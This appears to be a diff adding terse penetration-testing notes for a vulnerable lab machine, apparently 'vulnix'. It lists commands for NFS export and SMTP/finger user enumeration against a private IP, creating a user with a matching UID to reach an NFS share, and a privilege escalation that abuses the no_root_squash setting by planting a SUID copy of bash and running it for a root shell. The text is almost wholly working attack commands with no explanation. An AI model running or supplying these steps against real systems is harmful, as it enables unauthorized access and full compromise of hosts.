@@ -1,0 +1,22 @@
+showmount -e <IP>
+
+
+//will show which users are on the system.
+smtp-user-enum -M VRFY -U /usr/share/wordlists/metasploit/unix_users.txt -t 192.168.78.148
+
+
+//will show which user recently logged in
+for i in $(cat users);do finger $i $i@192.168.78.148;done
+
+
+//useradd with id 2008
+useradd vulnix –u 2008
+
+
+/etc/exports file has no_root_squash option
+
+
+
+cp /bin/bash localshell
+chmod 4777 localshell
+localshell -p
